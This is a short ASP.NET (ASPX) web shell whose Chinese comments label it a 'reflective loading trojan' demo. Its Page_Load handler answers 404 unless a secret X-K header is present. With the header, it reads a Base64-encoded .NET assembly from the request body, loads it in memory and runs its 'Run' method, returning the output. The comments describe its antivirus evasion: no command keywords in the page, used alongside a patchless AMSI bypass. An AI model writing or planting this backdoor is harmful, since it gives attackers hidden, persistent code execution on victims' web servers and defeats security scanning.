<%@ Page Language="C#" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
// ASPX 反射加载马 demo：请求 Base64 字节码 → Assembly.Load → 反射调用
// 免杀面：页面零命令关键词；配合 02 patchless AMSI（.NET 侧）使脚本扫描失效
void Page_Load(object s, EventArgs e) {
    if (string.IsNullOrEmpty(Request.Headers["X-K"])) { Response.StatusCode = 404; return; }
    byte[] asm = Convert.FromBase64String(new StreamReader(Request.InputStream).ReadToEnd());
    object r = Assembly.Load(asm).GetType("P").GetMethod("Run").Invoke(null, null);
    Response.Write(r);
}
</script>
